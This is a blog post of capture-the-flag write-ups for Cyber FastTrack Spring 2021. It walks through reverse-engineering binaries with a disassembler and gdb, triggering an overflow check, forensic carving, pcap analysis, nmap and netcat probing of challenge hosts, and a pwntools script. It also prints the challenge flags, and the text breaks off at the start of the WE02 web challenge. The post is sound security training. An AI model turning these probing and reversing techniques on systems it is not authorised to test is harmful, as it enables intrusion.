---
title: "Cyber FastTrack Spring 2021"
categories: [Writeups]
layout: post 
---

# Cyber FastTrack Spring 2021 Writeups

## Categories
* ### Binary 
    * #### [BE01](#challenge-be01)
    * #### [BE02](#challenge-be02)
    * #### [BM01](#challenge-bm01)
    * #### [BM02](#challenge-bm02)
    * #### [BM03](#challenge-bm03)
* ### Crypto 
    * #### [CM01](#challenge-cm01)
* ### Forensics 
    * #### [FE03](#challenge-fe03)
    * #### [FE04](#challenge-fe04)
    * #### [FM01](#challenge-fm01)
    * #### [FM02](#challenge-fm02)
* ### Networking
    * #### [NE01](#challenge-ne01)
    * #### [NM01](#challenge-nm01)
* ### Web
    * #### [WE01](#challenge-we01)
    * #### [WE02](#challenge-we02)
    * #### [WM03](#challenge-wm03)
    * #### [WH01](#challenge-wh01)
    * #### [WH02](#challenge-wh02)

----------------------------------------------------------------------------

### Challenge: BE01
### Category: Binary (Easy)

## Description:
#### [100 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Unzipping the provided file, we're presented with a file called `chicken.pdf` which just contains a picture of a chicken:

![](/assets/img/writeups/CyberFastTrackSpring2021/BE01%20Writeup.001.png)

Interesting.. Let's trying using a tool like [foremost](http://manpages.ubuntu.com/manpages/bionic/man8/foremost.8.html) to see if we can find any hidden files:

```bash
foremost chicken.pdf

Processing: chicken.pdf
|foundat=egg.zipPK

*|
```

Nice, it looks like foremost was able to find a ZIP file. Let's try to unzip it:

```bash
unzip 00000000.zip

Archive:  00000000.zip
error [00000000.zip]:  missing 72 bytes in zipfile
  (attempting to process anyway)
error: invalid zip file with overlapped components (possible zip bomb)
```

This had me confused for a little bit, it seemed that foremost didn't properly extract the ZIP file so I was getting errors. I tried just renaming `chicken.pdf` to `chicken.zip` and then unzipping:

```bash
cp chicken.pdf chicken.zip
unzip chicken.zip

Archive:  chicken.zip
 extracting: egg.zip
 ```

 Success! We extracted another file called `egg.zip`. Let's try extracting that one as well:

 ```bash
unzip egg.zip

Archive:  egg.zip
replace chicken.zip? [y]es, [n]o, [A]ll, [N]one, [r]ename:
```

Ah, it looks like it contains another file called `chicken.zip`. You could continue extracting by hand, but without knowing exactly how many zip files are nested within each other, this could be quite the task. So, I crafted a simple script to extract all of them for me:

```python
from zipfile import ZipFile
import os

# while there are still zip files to extract
while True:

    # open chicken.zip
    with ZipFile('chicken.zip', 'r') as zip_ref2:
        zip_ref2.extractall() # extract

    os.remove('chicken.zip') # remove chicken.zip

    # when we extracted chicken.zip, we got egg.zip
    with ZipFile('egg.zip','r') as zip_ref:
        zip_ref.extractall() # extract egg.zip

    os.remove('egg.zip') # remove egg.zip
```

Running the program, we quickly extract all of the files and get a file called `egg.pdf`:

![](/assets/img/writeups/CyberFastTrackSpring2021/BE01%20Writeup.002.png)

Nice, we got the flag! This was an interesting challenge. I'm not sure I'd exactly put it in the "Binary" category. This felt more like a forensics challenge.

### Flag: wh1ch_came_f1rst?

-----------------------------------------------------------------------------

### Challenge: BE02
### Category: Binary (Easy)

## Description:
#### [100 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Running the provided binary, we're presented with the following:

```bash
./rot13

===================================
ROT IN sHELL :: ROT13's your input!
===================================
>
```

So, the program just returns the ROT13 cipher for your input text. During the competition, I had a hunch that this would probably be a simple buffer overflow since it was an easy challenge. So I tried spamming my keyboard with `A` characters:

```bash
./rot13

===================================
ROT IN sHELL :: ROT13's your input!
===================================
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault.
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)

Flag: luckyNumber13
```

Sure enough, it was that simple! 

You could also open the program in a disassembler such as [Binary Ninja](https://binary.ninja/) and see that the program actually just checks for whether or not the input is less than or equal to 32 characters (hex: 0x20):

```cpp
0000090c  fgets(buf: &var_88, n: 0x64, fp: *stdin)
00000921  *(&var_88 + strlen(&var_88) - 1) = 0
00000932  if (strlen(&var_88) u<= 0x20)
```

Otherwise, if the input is more than 32 characters it will print the flag in a rather ugly way:

```cpp
00000950  else
00000950      int64_t var_128 = 0x61746e656d676553
00000957      int64_t var_120_1 = 0x756166206e6f6974
0000095e      int32_t var_118_1 = 0x2e746c
0000097c      int64_t var_c8 = 0x63617473202a2a2a
00000983      int64_t var_c0_1 = 0x696873616d73206b
0000099e      int64_t var_b8_1 = 0x636574656420676e
000009a5      int64_t var_b0_1 = 0x3a2a2a2a20646574
000009c0      int64_t var_a8_1 = 0x776f6e6b6e753c20
000009c7      int64_t var_a0_1 = 0x696d726574203e6e
000009ce      int32_t var_98_1 = 0x6574616e
000009d8      int16_t var_94_1 = 0x64
000009eb      uint64_t rdx_1 = 0x75642065726f6328
000009f5      int64_t var_e8 = 0x20646574726f6241
000009fc      int64_t var_e0_1 = 0x75642065726f6328
00000a03      int32_t var_d8_1 = 0x6465706d
00000a0d      int16_t var_d4_1 = 0x29
00000a16      char var_108 = 0x77
00000a1d      char var_107_1 = 0xf3
00000a24      char var_106_1 = 0xdb
00000a2b      char var_105_1 = 0xff
00000a32      char var_104_1 = 0x38
00000a39      char var_103_1 = 0xd2
00000a40      char var_102_1 = 0xef
00000a47      char var_101_1 = 0xf
00000a4e      char var_100_1 = 0xeb
00000a55      char var_ff_1 = 0xc7
00000a5c      char var_fe_1 = 0x1b
00000a63      char var_fd_1 = 0xb3
00000a6a      char var_fc_1 = 0x33
00000a71      char var_fb_1 = 0xd7
00000a78      char var_fa_1 = 0xf7
00000a7f      char var_f9_1 = 0xdf
00000a86      char var_f8_1 = 0x47
00000a8d      char var_f7_1 = 0x5e
00000a94      char var_f6_1 = 0x30
00000a9b      char var_f5_1 = 0xf5
00000b70      for (int32_t var_134_1 = 0; var_134_1 u<= 0x13; var_134_1 = var_134_1 + 1)
00000b0f          uint8_t var_135_12 = neg.b(not.b(neg.b(not.b(((not.b(neg.b(*(&var_108 + zx.q(var_134_1)))) - 0x4b) ^ var_134_1.b) - 0x1b) - var_134_1.b))) ^ 0x13
00000b54          rdx_1 = zx.q(((((zx.d(var_135_12) << 6).b | var_135_12 u>> 2) + 0x38) ^ var_134_1.b) - 0x32)
00000b5b          *(&var_108 + zx.q(var_134_1)) = rdx_1.b
00000b8c      printf(format: "\n\x1b[31m%s\n", &var_128, rdx_1)
00000b9b      puts(str: &var_c8)
00000bb6      printf(format: "%s\x1b[0m\n", &var_e8)
00000bd1      printf(format: "\n\x1b[32m%s\x1b[0m\n", &var_108)
00000cb0  if ((rax ^ *(fsbase + 0x28)) == 0)
00000cb0      return 0
00000ca2  __stack_chk_fail()
```

We can verify this by first sending 32 `A` characters to verify that the program still works, and then sending 33 `A` characters to see the flag printed:

```bash
python -c "print('A'*32)" | ./rot13

===================================
ROT IN sHELL :: ROT13's your input!
===================================
>
ROT13 output:
> NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
```

```bash
python -c "print('A'*33)" | ./rot13

===================================
ROT IN sHELL :: ROT13's your input!
===================================
>
Segmentation fault.
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)

Flag: luckyNumber13
```

### Flag: luckyNumber13

-----------------------------------------------------------------------------

### Challenge: BM01
### Category: Binary (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Running the provided binary, we're presented with the following:

```bash
./program

Какой пароль？
>
```

Interesting.. I do not speak Russian so I did a quick google translate to find out that the program is asking for a password. Let's try opening the program in a disassembler like [Binary Ninja](https://binary.ninja/):

```cpp
int32_t main(int32_t arg1, char** arg2, char** arg3)

000007d2  void* fsbase
000007d2  int64_t rax = *(fsbase + 0x28)
000007f3  puts(str: data_9e0)
00000804  printf(format: data_a04)
0000081c  void var_58
0000081c  fgets(buf: &var_58, n: 0x3c, fp: *stdin)
00000834  if (strcmp(data_9c8, &var_58) != 0)
00000911      puts(str: data_a37)
0000083c  else
0000083c      char var_67 = 0xe4
00000840      char var_66_1 = 0x64
00000844      char var_65_1 = 0xa6
00000848      char var_64_1 = 0x90
0000084c      char var_63_1 = 0x7c
00000850      char var_62_1 = 0xa6
00000854      char var_61_1 = 0x75
00000858      char var_60_1 = 0xb8
0000085c      char var_5f_1 = 0xa4
00000860      char var_5e_1 = 0xd
00000864      char var_5d_1 = 0xc
00000868      char var_5c_1 = 0x7f
0000086c      char var_5b_1 = 0x7e
00000870      char var_5a_1 = 0xf3
00000874      char var_59_1 = 1
000008ee      for (int32_t var_74_1 = 0; var_74_1 u<= 0xe; var_74_1 = var_74_1 + 1)
000008ad          char var_75_10 = not.b(not.b(not.b(neg.b(((*(&var_67 + zx.q(var_74_1)) ^ 0xa5) - var_74_1.b) ^ var_74_1.b)) ^ 0x8d) - 0xb)
000008e2          *(&var_67 + zx.q(var_74_1)) = ((((((zx.d(var_75_10) << 5).b | var_75_10 u>> 3) + 0x37) ^ 0xe5) - 7) ^ var_74_1.b) - 0x39
00000903      printf(format: data_a08, &var_67)
00000930  if ((rax ^ *(fsbase + 0x28)) == 0)
00000930      return 0
0000092a  __stack_chk_fail()
0000092a  noreturn
```

So, it looks like the program takes our input and then does a simple strcmp() on it with some data:

`if (strcmp(data_9c8, &var_58) != 0)`

strcmp() returns 0 when the two input strings are equal to each other, so when this if statement evaluates to true, the following error message is displayed: `неверный.` Google translating, again, reveals that this means "incorrect".

So, we need to figure out what our input is being compared to. We can click the `data_9c8` in Binary Ninja to take us to where that information is stored:

```cpp
000009c8  data_9c8:
000009c8                          d0 bc d0 be d0 bb d0 be d1 82 d0 be d0 ba 31 32 33 0a 00 00 00 00 00 00          ..............123.......
```

Cool, so this is the data that is being compared to our input, but Binary Ninja doesn't seem to be able to display some of the characters because they are in Russian. We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode the hex:

![](/assets/img/writeups/CyberFastTrackSpring2021/BM01%20Writeup.001.png)

Cool, that looks like the password! Let's trying sending that to the program with 123 added to the end:

```bash
./program

Какой пароль？
> молоток123
верный!

флаг: wh1te%BluE$R3d
```

Nice, we got the flag! Out of curiosity, I google translated the password and it seems to translate to `hammer123`

### Flag: wh1te%BluE$R3d

-----------------------------------------------------------------------------

### Challenge: BM02
### Category: Binary (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Running the provided binary, we're presented with the following:

```bash
./program

I'm not going to make it that easy for you.
```

So, let's open the program in a disassembler such as [Binary Ninja](https://binary.ninja/). The main function looks like what we would expect based off running the program:

```cpp
int32_t main(int32_t arg1, char** arg2, char** arg3)

000007eb  int32_t var_c = 1
0000080e  puts(str: "I'm not going to make it that ea…")
00000819  return 0
```

But if we take a look at the other functions, we find an interesting one called `printFlag`! Let's see what that one does:

```cpp
int64_t printFlag(int32_t arg1)

000006b5  void* fsbase
000006b5  int64_t rax = *(fsbase + 0x28)
000006c4  if (arg1 == 0x539)
000006d1      char var_28 = 0x15
000006d5      char var_27_1 = 0x70
000006d9      char var_26_1 = 0xe5
000006dd      char var_25_1 = 0x64
000006e1      char var_24_1 = 0x7a
000006e5      char var_23_1 = 0xd4
000006e9      char var_22_1 = 0x6d
000006ed      char var_21_1 = 0x75
000006f1      char var_20_1 = 0xeb
000006f5      char var_1f_1 = 0xf4
000006f9      char var_1e_1 = 0x6a
000006fd      char var_1d_1 = 0xd1
00000701      char var_1c_1 = 0xfa
00000705      char var_1b_1 = 0xd1
00000709      char var_1a_1 = 0xf9
0000070d      char var_19_1 = 0xe8
00000711      char var_18_1 = 0x9d
00000715      char var_17_1 = 0x7c
00000719      char var_16_1 = 0x41
000007ba      for (int32_t var_2c_1 = 0; var_2c_1 u<= 0x12; var_2c_1 = var_2c_1 + 1)
0000074a          char var_2d_7 = not.b(neg.b(((not.b(*(&var_28 + zx.q(var_2c_1))) + var_2c_1.b) ^ 0x48) - var_2c_1.b))
00000773          uint8_t var_2d_12 = (((((zx.d(var_2d_7) << 3).b | var_2d_7 u>> 5) - var_2c_1.b) ^ 0x5d) - 0x23) ^ var_2c_1.b
000007ae          *(&var_28 + zx.q(var_2c_1)) = ((zx.d(((var_2d_12 + var_2d_12) | var_2d_12 u>> 7) - 0x41) << 5).b | (((var_2d_12 + var_2d_12) | var_2d_12 u>> 7) - 0x41) u>> 3) ^ 0x65
000007c7      puts(str: &var_28)
000007d1  int64_t rax_22 = rax ^ *(fsbase + 0x28)
000007e2  if (rax_22 == 0)
000007e2      return rax_22
000007dc  __stack_chk_fail()
000007dc  noreturn
```

So it prints the flag as you would expect, but we need to pass `0x539` or `1337` as an argument: `if (arg1 == 0x539)`.

We can accomplish this with gdb. We can open the program in gdb like so:

`gdb program`

And then we can set a breakpoint at main, so that we can execute the program but it won't close at the main function:

`break main`

And finally, we can execute the program:

`r`

Cool, so we should now be able to access the `printFlag()` function by first casting it to the correct type (since printFlag doesn't actually return anything, we can just cast to void) and then supplying `1337` as the argument:

```bash
(gdb) p (void) printFlag(1337)
Flag: patchItFixIt
$1 = void
```

Nice!

### Flag: patchItFixIt

----------------------------------------------------------------------------

### Challenge: BM03
### Category: Binary (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Running the provided binary, we're presented with the following:

```bash
./flag

 Flag:
       __       __                          _                      ____ __
  ____/ /___   / /_   __  __ ____ _ ____ _ (_)____   ____ _       / __// /_ _      __
 Error displaying rest of flag
```

So it seems that we need to find some way to display the rest of the flag. Let's throw the program into a disassembler like [Binary Ninja](https://binary.ninja/). The main function looks like this:

```cpp
int32_t main(int32_t arg1, char** arg2, char** arg3)

000008df  fflush(fp: *stdout)
000008eb  puts(str: "\n\x1b[36m Flag:\x1b[0m")
000008f0  int32_t var_10 = 2
000008f7  int32_t var_c = 0x55
00000908  output(2, 0x55)
00000913  return 0
```

So it seems that the `output` function is what prints out the flag, and it is initially passed two arguments, `2` and `0x55`. Let's take a look at the output function:

```cpp
int64_t output(int32_t arg1, int32_t arg2)

000007a1  void* fsbase
000007a1  int64_t rax = *(fsbase + 0x28)
000007be  int64_t rcx = 0xff
000007c3  void var_818
000007c3  void* rdi = &var_818
000007c6  void* rsi = data_a00
000007c9  for (; rcx != 0; rcx = rcx - 1)
000007c9      *rdi = *rsi
000007c9      rdi = rdi + 8
000007c9      rsi = rsi + 8
000007cc  char var_1b = 0x20
000007d0  char var_1a = 0x5f
000007d4  char var_19 = 0x2f
000007d8  char var_18 = 0x5c
000007dc  char var_17 = 0x28
000007e0  char var_16 = 0x29
000007e4  char var_15 = 0x60
000007e8  char var_14 = 0x2c
000007ec  char var_13 = 0x7c
000007f0  char var_12 = 0x2e
000007f4  char var_11 = 0
0000089b  for (int32_t var_820 = 0; var_820 s< arg1; var_820 = var_820 + 1)
0000087c      for (int32_t var_81c_1 = 0; var_81c_1 s< arg2; var_81c_1 = var_81c_1 + 1)
00000822          int64_t rdx_1 = sx.q(var_820)
0000082c          int64_t rax_5 = (rdx_1 << 2) + rdx_1
0000083c          int32_t rcx_2 = *(&var_818 + ((rax_5 + (rax_5 << 4) + sx.q(var_81c_1)) << 2))
0000084a          int32_t temp0_1
0000084a          int32_t temp1_1
0000084a          temp0_1:temp1_1 = muls.dp.d(rcx_2, 0x51eb851f)
00000864          putchar(c: sx.d(*(&var_1b + sx.q((temp0_1 s>> 5) - (rcx_2 s>> 0x1f)))))
00000883      putchar(c: 0xa)
000008a1  if (arg1 s<= 5)
000008b1      puts(str: "\x1b[31m Error displaying rest o…")
000008bb  int64_t rax_18 = rax ^ *(fsbase + 0x28)
000008cc  if (rax_18 == 0)
000008cc      return rax_18
000008c6  __stack_chk_fail()
000008c6  noreturn
```

This looks like the rest of functions that have printed the flag in the other challenges, but there is one important condition towards the bottom:

```cpp
000008a1  if (arg1 s<= 5)
000008b1      puts(str: "\x1b[31m Error displaying rest o…")
```

So it seems that since we are only passing in `2` as the first argument, we are only able to see the first 2 rows of the flag, and in this case an error message is also shown if the first argument is less than 6.

We can use gdb to run the function manually and supply the proper argument value:

```bash
gdb flag
...
(gdb) break main
...
(gdb) r
...
(gdb) p output(6,0x55)
       __       __                          _                      ____ __
  ____/ /___   / /_   __  __ ____ _ ____ _ (_)____   ____ _       / __// /_ _      __
 / __  // _ \ / __ \ / / / // __ `// __ `// // __ \ / __ `/      / /_ / __/| | /| / /
/ /_/ //  __// /_/ // /_/ // /_/ // /_/ // // / / // /_/ /      / __// /_  | |/ |/ /
\__,_/ \___//_.___/ \__,_/ \__, / \__, //_//_/ /_/ \__, /______/_/   \__/  |__/|__/
                          /____/ /____/           /____//_____/
$1 = void
```

Nice, that's the flag!

### Flag: debugging_ftw

-----------------------------------------------------------------------------

### Challenge: CM01
### Category: Crypto (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Extracting the given zip file we're presented with two images:

![](/assets/img/writeups/CyberFastTrackSpring2021/CM01%20Writeup.001.png)

Hm, so it looks like we're given `frame.png` which is a QR code and `code.png` which looks very similar to a QR code but is obviously malformed. 

If you scan `frame.png`, you get the following text: `Hey, I've put the flag into the other file using the same trick we always use. You know what to do. :)`

So, we know that flag is within `code.png`. One of the first things I noticed was that the border of `code.png` is black while the border of `frame.png`. This made me think of the bitwise operation XOR which evaluates to true when the number of true inputs is odd. So if we imagine that the color black = 0 and the color white = 1, then the output would be white (1). 

With that understanding, let's trying to XOR these images together! I used a tool called [StegSolve](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) to perform this operation for me. Opening up `code.png` in StegSolve, and then choosing `Analyse -> Image Combiner` shows the XOR of the two images:

![](/assets/img/writeups/CyberFastTrackSpring2021/CM01%20Writeup.002.png)

That looks like a new QR code! Let's save it as `flag.png` and then scan it using [zbarimg](http://manpages.ubuntu.com/manpages/bionic/man1/zbarimg.1.html):

```bash
zbarimg flag.png

Connection Error (Failed to connect to socket /run/dbus/system_bus_socket: No such file or directory)
Connection Null
QR-Code:FLAG: A_Code_For_A_Code
scanned 1 barcode symbols from 1 images in 0.02 seconds
```

Nice, we got the flag!

### Flag: A_Code_For_A_Code

---------------------------------------------------------------------------

### Challenge: FE03
### Category: Forensics (Easy)

## Description:
#### [100 pts]: Download the file and find a way to get the flag from the docker image.

## Walkthrough:

We're provided a file named `fe03.tar.gz`. This challenge could be solved simply with strings:

```bash
strings fe03.tar | grep -i flag

home/secret/flag.txt
Flag: 8191-SiMpLeFilESysTemForens1Cs
...
zip -P taskdeadlyauditorywoodwork flag.zip flag.txt
rm /home/secret/flag.txt
...
zip -P taskdeadlyauditorywoodwork flag.zip flag.txt
rm /home/secret/flag.txt
home/secret/.wh.flag.txt
home/secret/flag.zip
flag.txtUT
flag.txtUT
 0home/secret/flag.txt
zip -P taskdeadlyauditorywoodwork flag.zip flag.txt
rm /home/secret/flag.txt
...
home/secret/flag.txt
Flag: 8191-SiMpLeFilESysTemForens1Cs
home/secret/flag.txt
Flag: 8191-SiMpLeFilESysTemForens1Cs
```

We could also use a tool like [foremost](http://manpages.ubuntu.com/manpages/bionic/man8/foremost.8.html) to carve out the zip file, and then use the password that we found from strings, `taskdeadlyauditorywoodwork`, to unzip and get `flag.txt`.

### Flag: 8191-SiMpLeFilESysTemForens1Cs

------------------------------------------------------------------------------

### Challenge: FE04
### Category: Forensics (Easy)

## Description:
#### [100 pts]: Download the file and filter down to the username according to criteria below.
#### The username you are looking for has `x` as the 3rd character, followed immediately by a number from `2` to `6`, it has a `Z` character in it and the last character is `S`.
#### When you have the username, submit it as the flag.

## Walkthrough:

We're provided a file named `50k-users.txt` which is a file with 50,000 usernames as the name would suggest. So, since we know exactly what we're looking for we can craft a regular expression to solve this for us. 

Using a site like [Regex101](https://regex101.com/), and some googling I came up with the following regular expression:

`^..x[2-6].*Z.*S$`

Brief explanation of the regular expression:

1. `^` = starts with
2. `.` = matches any character (since we don't care about the first 2 characters, but need to check the 3rd)
3. `.` = matches any character ""
4. `x` = matches the character x literally
5. `[2-6]` = matches a single character in the range between 2 and 6, right after the x
6. `.*Z` = match any character up until `Z`
7. `.*S$` = match any character up until `S` and `$` means S needs to be the last character

Once I had a working regular expression, I crafted the following script to go through the file and find me any matches:

```python
import re

# regular expression pattern
p = re.compile('^..x[2-6].*Z.*S$')

# open the 50k-users.txt file
with open('50k-users.txt', 'r') as f:

    # read all lines
    lines = f.readlines()

    # for each line
    for line in lines:

        # find a match
        possible = p.findall(line)

        # if the returned list isn't empty, we found a match
        if possible != []:
            print(possible)
```

Running the script, we get one username as the output which is the flag:

```bash
python find_username.py
['YXx52hsi3ZQ5b9rS']
```

Pretty cool challenge that required me to learn a few things and brush up on my regular expression skills.

### Flag: YXx52hsi3ZQ5b9rS 

---------------------------------------------------------------------------

### Challenge: FM01
### Category: Forensics (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

Opening the provided image file we're presented with the following:

![](/assets/img/writeups/CyberFastTrackSpring2021/FM01%20Writeup.001.png)

Interesting.. It just seems like a bunch of weird noise. Using exiftool, we can get the flag:

```bash
exiftool fm01.jpg

ExifTool Version Number         : 12.10
File Name                       : fm01.jpg
...
Text Layer Name                 : flag: tr4il3r_p4rk
Text Layer Text                 : flag: tr4il3r_p4rk
...
```

I think this solution was unintended so check out this [writeup](https://github.com/Alic3C/Cyber-FastTrack-Spring-2021/tree/main/Forensics/FM01) for probably the intended.

### Flag: tr4il3r_p4rk

-----------------------------------------------------------------------------

### Challenge: FM02
### Category: Forensics (Medium)

## Description:
#### [250 pts]: Download the file and find a way to get the flag.

## Walkthrough:

We're provided a pcapng file named `IRC-cap-vpn.pcapng`. Since IRC was in the name of the file, the first thing I did was sort by protocol in Wireshark and scrolled till I found some IRC packets (tcp.stream eq 57). Following the TCP stream we get the following output:

```
  

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

PRIVMSG RandumbHero1 :Hey man, How's it going?

:RandumbHero1!~User@82.102.19.124 PRIVMSG RiotCard851 :All good, how are you?

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

PRIVMSG RandumbHero1 :yeah Doing good, been working on something recently. Wanna check it out?

:RandumbHero1!~User@82.102.19.124 PRIVMSG RiotCard851 :Sure, What is it?

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

PRIVMSG RandumbHero1 :See if you can work it out first. I've hidden the flag in it. ;)

PRIVMSG RandumbHero1 :.DCC SEND "Flag.7z" 3232247681 35289 3466.

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

PRIVMSG RandumbHero1 :here you go!

PRIVMSG RandumbHero1 :Password on it, using the trick as usual.

ISON RandumbHero1

:barjavel.freenode.net 303 RiotCard851 :RandumbHero1

PRIVMSG RandumbHero1 :TWFyaW9SdWxlejE5ODU=

:RandumbHero1!~User@82.102.19.124 PRIVMSG RiotCard851 :Awesome, I'll go check it out now.
```

So it looks like there's two users, RandumbHero1 and RiotCard851, who are sharing a 7zip file between each other with a password. The very last message contains `TWFyaW9SdWxlejE5ODU=` which looks like Base64, so let's trying decoding that:

```bash
echo TWFyaW9SdWxlejE5ODU= | base64 -d

MarioRulez1985
```

Nice, that looks like a password. Now we just need to find the packets containing the 7zip file. I like to refer to this [page](https://www.7-zip.org/recover.html) whenever I have questions about the 7zip file format. Looking at that page we can figure out that the the 7zip file signature in hex is: `37 7A BC AF 27 1C`

We can search by hex value in Wireshark which takes us right to the packet containing the 7zip file (#2863, tcp.stream eq 79). Following the TCP stream, we can select "Show and save data as: Raw" to save the raw bytes, and save the file with a .7z extension.

Now it's as simple as unzipping the file with the password we found earlier with 7zip:

![](/assets/img/writeups/CyberFastTrackSpring2021/FM02%20Writeup.001.png)

Doing so, we get a file named Flag.nes. We can just run strings and grep for flag to find the flag:

```bash
strings Flag.nes | grep -i flag

You have found the flag!
but you found the flag!
Flag: NESted_in_a_PCAP
```

Nice and easy pcap challenge!

### Flag: NESted_in_a_PCAP


----------------------------------------------------------------------------

### Challenge: NE01
### Category: Networking (Easy)

## Description:
#### [250 pts]: There is a TCP network service running on `cfta-ne01.allyourbases.co`. Find it to get the flag after you connect.
#### Note: The target has many open ports - only one is the correct one. The correct port will identify itself with `ID: ne01` after you connect.

## Walkthrough:

So we need to find which port this server is using, we can do a simple Nmap scan to figure out which ports are open:

```bash
nmap -Pn cfta-ne01.allyourbases.co

Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-08 11:29
Nmap scan report for cfta-ne01.allyourbases.co (52.210.101.4
Host is up (0.13s latency).
Other addresses for cfta-ne01.allyourbases.co (not scanned):
rDNS record for 52.210.101.44: ec2-52-210-101-44.eu-west-1.c
Not shown: 999 filtered ports
PORT     STATE SERVICE
1061/tcp open  kiosk

Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
```

Cool, Nmap was only able to find one port so this makes our lives a lot easier. We can use netcat to connect to the server with port `1061`:

```bash
nc cfta-ne01.allyourbases.co 1061

ID: ne01
Flag: Nmap_0f_the_W0rld!
```

Nice, there's the flag!

### Flag: Nmap_0f_the_W0rld!

--------------------------------------------------------------------------

### Challenge: NM01 
### Category: Networking (Medium)

## Description:
#### [250 pts]: Retrieve output from network endpoint at `cfta-nm01.allyourbases.co` port `8017` and figure out how to get the flag.

## Walkthrough:

Trying to connect to the server with netcat, we're presented the following:

```bash
nc cfta-ne01.allyourbases.co 8017

\x4B\x43\x59\x43\x55\x53
```

That looks like hex. Let's try hex decoding it with [CyberChef](https://gchq.github.io/CyberChef/):

![](/assets/img/writeups/CyberFastTrackSpring2021/NM01%20Writeup.001.png)

Cool, so we get the output `IZBMDR`. If we send this back to the server we get a message that says `Too Slow!`.

Since the server generates a different hex-string each time, we need some way of decoding it and sending it to the server automatically. We can accomplish this by using the python library, [pwntools](https://github.com/Gallopsled/pwntools).

I crafted the following script to solve this:

```python
from pwn import *

# connect to the server
r = remote('cfta-nm01.allyourbases.co',8017)

# receive the hex string and remove \n
prompt = r.recvline().strip()

# remove the \x so we can decode the hex
prompt = "".join([x for x in prompt.decode() if x not in "\\x"])

# decode the hex string
prompt = bytes.fromhex(prompt)

# send the decoded hex to the server
r.sendline(prompt)
r.interactive() # allows us to the see flag
```

Running the script we get the flag from the server:

```bash
python3 get_flag.py

[+] Opening connection to cfta-nm01.allyourbases.co on port 8017: Done
[*] Switching to interactive mode
Correct! - Flag: o[hex]=>i[ascii]=:)[*] Got EOF while reading in interactive
```

### Flag: o[hex]=>i[ascii]=:)

----------------------------------------------------------------------------

### Challenge: WE01
### Category: Web (Easy)

## Description:
#### [100 pts]: View the page at [https://cfta-we01.allyourbases.co](https://cfta-we01.allyourbases.co) and try to get the flag.

## Walkthrough:

Navigating to the provided URL we're presented with the following page:

![](/assets/img/writeups/CyberFastTrackSpring2021/WE01%20Writeup.001.png)

This looks really strange. It reminded me of [JSFuck](http://www.jsfuck.com/), an esoteric programming style in Javascript, but it obviously has different symbols. So I copied the text and googled it to see if I could find anything on it. 

The first thing that appeared was this [tweet](https://twitter.com/aemkei/status/755147932081483776) which mentioned [Aurebesh.js](http://aem1k.com/aurebesh.js/). This is a cool tool that will generate valid javascript code using symbols/letters from other languages, including a writing system from Stars Wars called [Aurebesh](https://starwars.fandom.com/wiki/Aurebesh).

So, since this is valid javascript we can just run the code in the console of a browser, which gives us the flag:

```
>> ロ='',コ=!ロ+ロ,Y=!コ+ロ,ㅣ=ロ+{},ᗐ=コ[ロ++],Ξ=コ[Δ=ロ],ᐳ=++Δ+ロ,ㅡ=ㅣ[Δ+ᐳ],ウ="+=*:.",コ[ㅡ+=ㅣ[ロ]+(コ.Y+ㅣ)[ロ]+Y[ᐳ]+ᗐ+Ξ+コ[Δ]+ㅡ+ᗐ+ㅣ[ロ]+Ξ][ㅡ](ㅣ[Δ+ᐳ]+ㅣ[ロ]+(コ.Y+ㅣ)[ロ]+Y[ᐳ]+ㅣ[ロ]+Y[Δ]+コ[ᐳ]+ウ[ᐳ+ロ]+Y[Δ]+ㅣ[ロ]+(([]+([]+[])[ㅡ])[ᐳ*(ᐳ+ロ)+Δ])+"(Y[Δ-Δ]+Y[Δ]+Y[ロ]+(([]+([]+[])[ㅡ])[ᐳ*(ᐳ+ロ)+Δ])+ウ[ᐳ]+ㅣ[(ᐳ+ロ)*ロ+ᐳ]+コ[Δ]+(コ.Y+ㅣ)[ロ]+(コ.Y+ㅣ)[ᐳ*Δ-ロ]+ㅡ[ロ-ロ]+ㅡ[ロ]+(コ.Y+ㅣ)[ᐳ-ロ]+コ[ᐳ]+ウ[ロ-ロ]+ㅣ[ロ]+ㅣ[Δ]+Y[Δ-Δ]+コ[Δ]+Y[ᐳ]+ㅡ[ᐳ-ᐳ]+Y[ロ]+ᗐ+(コ.Y+ㅣ)[ᐳ*Δ-ロ]+ㅣ[ロ]+(コ.Y+ㅣ)[ロ]+ウ[ロ]+ㅣ[ᐳ]+Y[ᐳ]+ウ[Δ]+Y[Δ-Δ]+コ[Δ]+(コ.Y+ㅣ)[ロ] )")()
flag: unicode+obfuscation=js*fun
```

### Flag: unicode+obfuscation=js*fun

----------------------------------------------------------------------------

### Challenge: WE02 
### Category: Web (Easy)

## Description:
#### [100 pts]: View the page at [https://cfta-we02.allyourbases.co](https://cfta-we02.allyourbases.co) and try to get the flag.

## Walkthrough:

Navigating to the provided URL, we're presented with a simple boiler plate site:

![](/assets/img/writeups/CyberFastTrackSpring2021/WE02%20Writeup.001.png)

There's not much interesting on the site besides this block under `/News` that mentions a secret link:

![](/assets/img/writeups/CyberFastTrackSpring2021/WE02%20Writeup.002.png)

